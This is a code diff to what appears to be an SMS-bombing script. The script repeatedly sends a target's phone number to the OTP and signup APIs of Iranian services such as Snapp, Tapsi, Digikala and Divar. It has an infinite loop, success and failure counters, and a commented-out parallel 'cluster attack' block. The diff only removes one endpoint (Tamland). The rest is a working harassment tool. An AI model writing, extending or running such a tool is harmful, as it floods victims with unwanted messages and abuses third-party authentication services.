@@ -21,7 +21,6 @@ snapp = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
 tapsi = 'https://api.tapsi.cab/api/v2.2/user'
 digikala = 'https://api.digikala.com/v1/user/authenticate/'
 basalam = 'https://auth.basalam.com/otp-request'
-tamland = 'https://api.tamland.ir/api/user/signup'
 alibaba = 'https://ws.alibaba.ir/api/v3/account/mobile/otp'
 divar = 'https://api.divar.ir/v5/auth/authenticate'
 anten = 'https://api2.anten.ir/users'
@@ -140,21 +139,6 @@ def basalam_api():
         print(f'   {lightred}[ {current_time()} ] Request Timeout --> API: Basalam')
         lost+=1
 
-def tamland_api():
-    global sent, bad, lost
-    try:    
-        data = {"Mobile":phone_number}
-        req = post(tamland, json=data, timeout=2)
-        if req.status_code == 200:
-            print(f'   {green}[ {current_time()} ] Sent Successfully --> API: Tamland')
-            sent+=1
-        else:
-            print(f'   {yellow}[ {current_time()} ] Bad Request --> CODE: [ {req.status_code} ] API: Tamland')
-            bad+=1
-    except:
-        print(f'   {lightred}[ {current_time()} ] Request Timeout --> API: Tamland')
-        lost+=1
-
 def alibaba_api():
     global sent, bad, lost
     try:    
@@ -253,7 +237,7 @@ def ending():
     exit()
 
 #--------[ CALLING FUNCTIONS ]--------#
-def_list = [torob_api, snapp_api, snappdoctor_api, basalam_api, alibaba_api, anten_api, tamland_api, tapsi_api, digikala_api, divar_api, ponisha_api]
+def_list = [torob_api, snapp_api, snappdoctor_api, basalam_api, alibaba_api, anten_api, tapsi_api, digikala_api, divar_api, ponisha_api]
 start_time = current_time()
 while True:
     for defs in def_list:
@@ -263,7 +247,7 @@ while True:
             defs()
         
 #--------[ CLUSTER AttACK ]--------#
-#def_list = [torob_api, snapp_api, snappdoctor_api, basalam_api, alibaba_api, anten_api, tamland_api, tapsi_api, digikala_api, divar_api, ponisha_api]
+#def_list = [torob_api, snapp_api, snappdoctor_api, basalam_api, alibaba_api, anten_api, tapsi_api, digikala_api, divar_api, ponisha_api]
 #with concurrent.futures.ProcessPoolExecutor() as executor:
 #    for defs in def_list:
 #        executor.submit(defs)
